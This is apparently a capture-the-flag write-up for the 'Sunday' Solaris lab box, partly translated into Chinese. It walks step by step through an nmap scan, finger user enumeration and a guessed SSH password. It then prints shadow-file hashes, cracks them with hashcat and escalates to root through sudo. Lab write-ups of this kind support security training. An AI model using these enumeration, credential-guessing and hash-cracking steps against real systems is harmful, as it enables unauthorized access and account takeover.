1,Recon
port scan
```
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.76
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-03 11:08 EDT
Warning: 10.10.10.76 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.76
Host is up (0.096s latency).
Not shown: 61176 filtered ports, 4355 closed ports
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
65258/tcp open  unknown

nmap -sV -sC -p 79,111,22022,65258 -oA nmap/scripts 10.10.10.76
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-03 11:11 EDT
Nmap scan report for 10.10.10.76
Host is up (0.096s latency).

PORT      STATE SERVICE   VERSION
79/tcp    open  finger    Sun Solaris fingerd
| finger: Login       Name               TTY         Idle    When    Where\x0D
| sunny    sunny                 pts/1            Thu 14:52  10.10.14.245        \x0D
| sunny    sunny                 pts/2          4 Thu 13:55  10.10.15.182        \x0D
| sunny    sunny                 pts/4          2 Thu 13:55  10.10.16.94         \x0D
| sunny    sunny                 pts/5          8 Thu 14:52  10.10.15.42         \x0D
| sunny    sunny                 pts/6         21 Thu 14:14  10.10.14.120        \x0D
| sunny    sunny                 pts/7          2 Thu 14:32  10.10.15.138        \x0D
| sunny    sunny                 pts/8         49 Thu 14:20  10.10.15.167        \x0D
| sunny    sunny                 pts/9          9 Thu 14:28  10.10.14.122        \x0D
| sammy    sammy                 pts/10           Thu 15:07  10.10.14.78         \x0D
| sunny    sunny                 pts/11         1 Thu 15:06  10.10.16.73         \x0D
| sammy    sammy                 pts/12         4 Thu 14:44  10.10.15.38         \x0D
| sammy    sammy                 pts/13           Thu 15:10  10.10.15.182        \x0D
|_sammy    sammy                 pts/14         1 Thu 15:06  10.10.15.213        \x0D
111/tcp   open  rpcbind   2-4 (RPC #100000)
22022/tcp open  ssh       SunSSH 1.3 (protocol 2.0)
| ssh-hostkey:
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
65258/tcp open  smserverd 1 (RPC #100155)
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.97 seconds
```

The finger daemon listens on port 79, and is really a relic of a time when computers were far too trusting and open. It provides status reports on logged in users. It can also provide details about a specific user and when they last logged in and from where.
Finger守护进程侦听端口 79，它实际上是计算机过于信任和开放的时代的遗迹。它提供登录用户的状态报告。它还可以提供有关特定用户以及他们上次登录的时间和地点的详细信息。

Running finger @[ip] will tell us of any currently logged in users:
```
finger @10.10.10.76
No one logged on
```

finger can also check for details on a specific user. Try one that doesn’t exist:
```
inger wither@10.10.10.76
Login       Name               TTY         Idle    When    Where
wither                ???
```

Then let's check what we have got from nmap
```
(wither㉿localhost)-[~/Templates/htb-labs/Sunday]
└─$ finger sunny@10.10.10.76
Login       Name               TTY         Idle    When    Where
sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         
                                                                                      
┌──(wither㉿localhost)-[~/Templates/htb-labs/Sunday]
└─$ finger sammy@10.10.10.76
Login       Name               TTY         Idle    When    Where
sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13 
```

With two known accounts, and ssh, it’s worth guessing a few passwords. I always try admin, root, the box name, and any defaults for the application. Turns out sunny/sunday works:
```
ssh -p 22022 sunny@10.10.10.76
Password: sunday
Last login: Thu May  3 15:25:35 2018 from 10.10.14.12
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ pwd
/export/home/sunny
sunny@sunday:~$ id
uid=65535(sunny) gid=1(other) groups=1(other)
```

Inside /backup there’s a copy of a shadow file that is world readable:
```
sunny@sunday:/backup$ ls -l
total 2
-r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup

sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Then we just need to use hashcat to crack them
```
 hashcat -m 7400 sunday.hashes /usr/share/wordlists/rockyou.txt --force
...[snip]...
$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:sunday
$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
...[snip]...
```

When we check `sudo -l`
```
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```
Then we just need to `sudo su `and input the password, then get the root shell.
